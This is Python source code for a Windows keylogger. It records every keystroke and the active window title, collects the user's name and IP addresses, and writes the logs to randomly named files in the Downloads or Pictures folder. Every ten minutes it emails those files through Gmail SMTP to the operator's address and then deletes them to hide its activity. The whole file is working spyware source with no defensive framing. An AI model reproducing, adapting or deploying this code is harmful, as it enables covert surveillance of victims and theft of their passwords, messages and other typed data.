from pynput.keyboard import Key, Listener
import time
import os
import random
import requests
import socket
import win32gui
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import config
import threading

# Grabs the users data
publicIP = requests.get('https://api.ipify.org').text
privateIP = socket.gethostbyname(socket.gethostname())
user = os.path.expanduser('~').split('\\')[2]
datetime = time.ctime(time.time())

msg = f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n\n'
logged_data = []
logged_data.append(msg)

old_app = ''
delete_file = []


def on_press(key):
    global old_app

    # This grabs and tells us what window they are currently using and if it changes
    new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())

    if new_app == 'Cortana':
        new_app = 'Windows Start Menu'
    else:
        pass

    if new_app != old_app and new_app != '':
        logged_data.append(f'\n[{datetime}] ~ {new_app}\n')
        old_app = new_app
    else:
        pass

    # Cleans up the key presses to look nicer
    substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
                    'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]',
                    'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', '\\x13',
                    '[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd',
                    '[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']

    # If the key entered is in the list then it uses the one to the right.
    key = str(key).strip('\'')
    if key in substitution:
        logged_data.append(substitution[substitution.index(key) + 1])
    else:
        logged_data.append(key)

# Creates 2 possible directories to send the file to
def write_file(count):
    one = os.path.expanduser('~') + '/Downloads'
    two = os.path.expanduser('~') + '/Pictures'

    list = [one, two]

    # randomly assigns where file goes and then assigns it a random name with a set 'I' to denote its true intent to us
    filepath = random.choice(list)
    filename = str(count) + 'I' + str(random.randint(1000000, 9999999)) + '.txt'
    file = filepath + filename
    delete_file.append(file)

    with open(file, 'w') as fp:
        fp.write(''.join(logged_data))


# This sends the logged file to a specific email address
def send_logs():
    count = 0

    fromAddr = config.fromAddr
    fromPswd = config.fromPswd
    toAddr = fromAddr

    # every 10 mins write file/send log
    MIN = 10
    SECONDS = 60
    time.sleep(MIN * SECONDS)

    while True:
        if len(logged_data) > 1:
            try:
                write_file(count)

                subject = f'[{user}] ~ {count}'

                msg = MIMEMultipart()
                msg['From'] = fromAddr
                msg['To'] = toAddr
                msg['Subject'] = subject
                body = 'testing'
                msg.attach(MIMEText(body, 'plain'))

                attachment = open(delete_file[0], 'rb')

                filename = delete_file[0].split('/')[2]

                # breaking down and encodes into base 64 then attaches the attachment
                part = MIMEBase('application', 'octect-stream')
                part.set_payload((attachment).read())
                encoders.encode_base64(part)
                part.add_header('content-disposition', 'attachment;filename=' + str(filename))
                msg.attach(part)

                text = msg.as_string()

                # Making a connection to gmail and securing the connection
                # Sending the email
                s = smtplib.SMTP('smtp.gmail.com', 587)
                s.ehlo()
                s.starttls()

                s.ehlo()
                s.login(fromAddr, fromPswd)
                s.sendmail(fromAddr, toAddr, text)

                attachment.close()
                s.close()

                # Deletes the file that was just sent via email
                os.remove(delete_file[0])
                del logged_data[1:]
                del delete_file[0:]

                count += 1

            except Exception:
                pass


if __name__ == '__main__':
    T1 = threading.Thread(target=send_logs)
    T1.start()

    with Listener(on_press=on_press) as listener:
        listener.join()